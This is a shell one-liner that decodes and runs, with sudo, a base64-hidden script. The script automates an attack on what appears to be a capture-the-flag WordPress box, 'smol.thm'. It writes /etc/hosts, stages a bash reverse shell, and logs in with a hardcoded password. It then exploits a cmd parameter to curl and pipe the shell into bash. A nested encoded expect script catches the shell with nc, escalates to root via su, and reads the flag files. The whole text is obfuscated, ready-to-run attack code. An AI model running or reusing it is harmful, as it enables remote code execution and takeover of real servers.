echo "IyEvYmluL2Jhc2gKCiMgUmVhZCBpbnB1dHMKZWNobyAiRW50ZXIgeW91ciB0YXJnZXQ6ICIKcmVhZCBSSE9TVAplY2hvICJFbnRlciB5b3VyIGxvY2FsaG9zdDogIgpyZWFkIExIT1NUCmVjaG8gIkVudGVyIHlvdXIgbG9jYWxwb3J0OiAiCnJlYWQgTFBPUlQKCiMgV3JpdGluZyB0aGUgdGFyZ2V0IGlwIHRvIHRoZSBob3N0cyBmaWxlCiNlY2hvICJbKl0gQWRkaW5nIHRhcmdldCBpcCB0byAvZXRjL2hvc3RzIHdpdGggY29ycmVjdCBkb21haW4gbmFtZS4uLiIKZWNobyAiJFJIT1NUICAgICB3d3cuc21vbC50aG0iID4+IC9ldGMvaG9zdHMKCiMgU3RhZ2luZyB0aGUgcGF5bG9hZAplY2hvICcjIS9iaW4vYmFzaApiYXNoIC1pID4mIC9kZXYvdGNwLyciJExIT1NUIicvJyIkTFBPUlQiJyAwPiYxJyA+IHNoZWxsLnNoCiNlY2hvICJbKl0gUGF5bG9hZCBzdGFnZWQgYXQgc2hlbGwuc2giCiMgU3RhcnRpbmcgdGhlIHB5dGhvbiBzZXJ2ZXIgaW4gdGhlIGJhY2tncm91bmQKI2VjaG8gIlsqXSBTdGFydGluZyBIVFRQIHNlcnZlciBvbiBwb3J0IDg4ODguLi4iCnB5dGhvbiAtbSBodHRwLnNlcnZlciA4ODg4ID4gL2Rldi9udWxsIDI+JjEgJgpodHRwX3NlcnZlcl9waWQ9JCEKCndhaXQ0aXQ9J0l5RXZkWE55TDJKcGJpOWxlSEJsWTNRS0NuTmxkQ0JNVUU5U1ZDQmJiR2x1WkdWNElDUmhjbWQySURCZENuTmxkQ0IwYVcxbGIzVjBJRFl3TUFwc2IyZGZkWE5sY2lBeENuTmxkQ0J6Wlc1a1gzTnNiM2NnZXpFZ0xqQXhmUW9LWlhaaGJDQnpjR0YzYmlCdVl5QXRiblpzY0NBa1RGQlBVbFFLQ2lOVmNHZHlZV1JsSUhOb1pXeHNJQXBsZUhCbFkzUWdld29nSUNBZ2RHbHRaVzkxZENCN0lITmxibVJmZFhObGNpQWlkR2x0Wlc5MWRGeHVJanNnWlhocGRDQjlDaUFnSUNBaUtsd2tLaUlnZXlCelpXNWtJQ0p3ZVhSb2IyNHpJQzFqSUNkcGJYQnZjblFnY0hSNU8zQjBlUzV6Y0dGM2JpaGNJaTlpYVc0dmMyaGNJaWtuWEhJaU95QjlDZ3A5Q2dwbGVIQmxZM1FnZXdvZ0lDQWdkR2x0Wlc5MWRDQjdJSE5sYm1SZmRYTmxjaUFpZEdsdFpXOTFkRnh1SWpzZ1pYaHBkQ0I5Q2lBZ0lDQWlLbHdrS2lJZ2V5QnpaVzVrSUNKemRTQnliMjkwWEhJaUlIMEtmUW9LWlhod1pXTjBJSHNLSUNBZ0lIUnBiV1Z2ZFhRZ2V5QnpaVzVrWDNWelpYSWdJblJwYldWdmRYUmNiaUk3SUdWNGFYUWdmUW9nSUNBZ0lpcFFZWE56ZDI5eVpEb3FJaUI3SUhObGJtUWdJbkp2YjNSY2NpSWdmUXA5Q2dwbGVIQmxZM1FnZXdvZ0lDQWdkR2x0Wlc5MWRDQjdJSE5sYm1SZmRYTmxjaUFpZEdsdFpXOTFkRnh1SWpzZ1pYaHBkQ0I5Q2lBZ0lDQWlLbHdrS2lJZ2V5QnpaVzVrSUNKallYUWdMMmh2YldVdlpHbGxaMjh2ZFhObGNpNTBlSFJjY2lJZ2ZRcDlDZ3BsZUhCbFkzUWdld29nSUNBZ2RHbHRaVzkxZENCN0lITmxibVJmZFhObGNpQWlkR2x0Wlc5MWRGeHVJanNnWlhocGRDQjlDaUFnSUNBaUtsd2tLaUlnZXlCelpXNWtJQ0pqWVhRZ0wzSnZiM1F2Y205dmRDNTBlSFJjY2lJZ2ZRcDlDZ3BsZUhCbFkzUWdld29nSUNBZ2RHbHRaVzkxZENCN0lITmxibVJmZFhObGNpQWlkR2x0Wlc5MWRGeHVJanNnWlhocGRDQjlDaUFnSUNBaUtsd2tLaUlnZXlCelpXNWtJQ0psZUdsMFhISWlJSDBLZlFwbGVIQmxZM1FnZXdvZ0lDQWdkR2x0Wlc5MWRDQjdJSE5sYm1SZmRYTmxjaUFpZEdsdFpXOTFkRnh1SWpzZ1pYaHBkQ0I5Q2lBZ0lDQWlLbHdrS2lJZ2V5QnpaVzVrSUNKbGVHbDBYSElpSUgwS2ZRb0taWGh3WldOMElIc0tJQ0FnSUhScGJXVnZkWFFnZXlCelpXNWtYM1Z6WlhJZ0luUnBiV1Z2ZFhSY2JpSTdJR1Y0YVhRZ2ZRb2dJQ0FnSWlwY0pDb2lJSHNnYzJWdVpDQWlaWGhwZEZ4eUlpQjlDbjA9JwoKZWNobyAiJHdhaXQ0aXQiIHwgYmFzZTY0IC1kID4gd2FpdDRpdApjaG1vZCAreCB3YWl0NGl0Ci4vd2FpdDRpdCAkTFBPUlQgPiBvdXRwdXQubG9nICYKCiNlY2hvICJbKl1HcmFiYmluZyB0aGUgY29va2llcy4uLiIKY3VybCAnaHR0cDovL3d3dy5zbW9sLnRobS93cC1sb2dpbi5waHAnIC1YIFBPU1QgXAogIC1IICdVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjEyOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyOC4wJyBcCiAgLUggJ0FjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL3BuZyxpbWFnZS9zdmcreG1sLCovKjtxPTAuOCcgXAogIC1IICdBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41JyBcCiAgLUggJ0FjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZScgXAogIC1IICdSZWZlcmVyOiBodHRwOi8vd3d3LnNtb2wudGhtL3dwLWxvZ2luLnBocCcgXAogIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcgXAogIC1IICdPcmlnaW46IGh0dHA6Ly93d3cuc21vbC50aG0nIFwKICAtSCAnQ29ubmVjdGlvbjoga2VlcC1hbGl2ZScgXAogIC1IICdDb29raWU6IHdvcmRwcmVzc190ZXN0X2Nvb2tpZT1XUCUyMENvb2tpZSUyMGNoZWNrOyB3cF9sYW5nPWVuX1VTJyBcCiAgLUggJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDEnIFwKICAtSCAnUHJpb3JpdHk6IHU9MCwgaScgXAogIC0tZGF0YS1yYXcgJ2xvZz13cHVzZXImcHdkPWtiTFNGMlZvcCUyM2x3M3JqRFo2MjkqWiUyNUcmd3Atc3VibWl0PUxvZytJbiZyZWRpcmVjdF90bz1odHRwJTNBJTJGJTJGd3d3LnNtb2wudGhtJTJGd3AtYWRtaW4lMkYmdGVzdGNvb2tpZT0xJyBcCiAgLWMgY29va2llcy50eHQKCmNvb2tpZXM9KCQoY2F0IGNvb2tpZXMudHh0fGF3ayAne3ByaW50ICQ3fSd8Z3JlcCB3cHVzZXIpKQoKI2VjaG8gIlsqXUV4cGxvaXRpbmcgdGhlIHdlYiBzZXJ2ZXIuLi4iCmN1cmwgLXMgLVggJCdHRVQnIFwKCSAtSCAkJ0hvc3Q6IHd3dy5zbW9sLnRobScgXAoJIC1iIGNvb2tpZXMudHh0ICJodHRwOi8vd3d3LnNtb2wudGhtL3dwLWFkbWluL2luZGV4LnBocD9jbWQ9Y3VybCUyMGh0dHA6Ly8ke0xIT1NUfTo4ODg4L3NoZWxsLnNoJTIwfCUyMGJhc2giID4vZGV2L251bGwgMj4mMQoKcm0gLWYgY29va2llcy50eHQKY2F0IG91dHB1dC5sb2cgfCBncmVwIC1BIDEgImNhdCI=" | base64 -d > oneliner.sh && chmod +x oneliner.sh && sudo ./oneliner.sh
